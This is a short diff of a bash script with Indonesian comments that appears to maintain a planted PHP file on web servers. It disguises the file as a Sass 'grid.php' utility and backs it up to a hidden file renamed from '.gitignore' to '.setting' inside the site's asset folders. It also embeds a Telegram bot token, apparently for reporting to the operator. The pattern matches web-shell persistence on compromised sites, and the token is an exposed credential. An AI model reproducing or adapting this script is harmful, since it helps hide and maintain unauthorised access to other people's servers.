@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/srv/www/worthunlimited.co.uk/public/finetune/assets/source/sass/tools/functions/grid.php"
+INDEX_FILE="/srv/www/worthunlimited.co.uk/public/finetune/assets/source/sass/bootstrap/utilities/grid.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/srv/www/xlrjetcentres.com/storage/app"
+BACKUP_FOLDER="/srv/www/worthunlimited.co.uk/public/finetune/assets/source/sass/settings/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/.gitignore"
+BACKUP_FILE="$BACKUP_FOLDER/.setting"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
